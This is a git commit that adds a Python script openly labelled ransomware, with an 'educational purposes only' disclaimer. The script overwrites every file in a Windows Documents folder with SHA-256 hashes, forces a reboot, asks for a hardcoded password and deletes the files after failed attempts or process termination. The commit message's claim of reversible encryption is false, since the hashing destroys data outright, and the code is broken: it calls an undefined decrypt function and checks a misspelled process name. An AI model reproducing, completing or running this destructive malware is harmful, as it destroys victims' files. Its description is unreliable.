80554d59d3452e33868ff22a49ef52092eab9baf
nikosp2009 <113636645+nikosp2009@users.noreply.github.com>
2023-04-30 17:23:17 +0300

    ransomware.py
    this is a very dangerous ransomware use it wisely, you are responsible for you doings it is for educational purposes only. It actually encrytps all the files in the documents file (you can customize that in your needs. If you want you can make it encrypt every file in the computer except windows.) and then it restarts. Then when the computer is running again the ransomware asks you to type a password that password is; %2Jg@m#sg#@&p@nt@!$%. the victim has three tries to type it correctly if it is typed wrong all the three time then the documets files are deleted (you can customize it too) also if the program is closed form the task manager or the window then the documents files will be deleted as well (you can customize it as well). But if the password is correct then the documents files (you know what I would say here) would be decrypted and the program won't run unless the user does so and the computer is safe

---
+++ ransomware.py
@@ -0,0 +1,50 @@
+import os
+import psutil
+import sys
+import hashlib
+
+password = '%2Jg@m#sg#@&p@nt@!$%'
+max_tries = 3
+
+def encrypt_file(filename, key):
+    with open(filename, 'rb') as f:
+        data = f.read()
+    encrypted_data = hashlib.sha256(key.encode() + data).hexdigest().encode()
+    with open(filename, 'wb') as f:
+        f.write(encrypted_data)
+
+def encrypt_files(path, key):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path, key)
+
+def delete_files(path):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            os.remove(file_path)
+
+def check_process(process_name):
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == process_name:
+            return True
+    return False
+
+def ransomware():
+    encrypt_files('C:\\Users\\<username>\\Documents', password)
+    os.system('shutdown /r /t 0')
+    for i in range(max_tries):
+        user_input = input('Enter password: ')
+        if user_input == password:
+          decrypt_files('C:\\Users\\<username>\\Documents', '')
+          sys.exit(0)
+
+        else:
+            print('Incorrect password. Attempts remaining: ', max_tries-i-1)
+    delete_files('C:\\Users\\<username>\\Documents')
+
+while True:
+    if not check_process('ransomeware.py'):
+        delete_files('C:\\Users\\<username>\\Documents')
+        break
